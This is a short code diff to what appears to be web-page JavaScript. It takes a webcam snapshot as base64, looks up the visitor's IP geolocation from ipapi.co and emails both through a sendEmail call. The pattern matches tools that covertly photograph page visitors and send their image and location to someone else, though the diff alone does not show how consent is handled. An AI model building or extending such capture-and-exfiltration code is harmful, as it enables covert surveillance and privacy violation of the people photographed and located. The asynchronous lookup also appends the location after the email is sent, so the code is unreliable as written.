@@ -54,7 +54,18 @@
             context.drawImage(video,0,0,640,480)
             const base64image=canvas.toDataURL('image/jpeg');
             console.log(base64image)
-            sendEmail(base64image)
+            var Body="Attachment of the webcam snap";
+            try{
+                $.getJSON('https://ipapi.co/json/', function(data) {
+                    var ipdata=JSON.stringify(data, null, 2)
+                    console.log(ipdata);
+                    Body+="\n"+ipdata;
+                });
+            }catch{
+                console.log("Error")
+                Body+="\n"+"[ERROR]";
+            }
+            sendEmail(base64image,Body)
     }
 
 
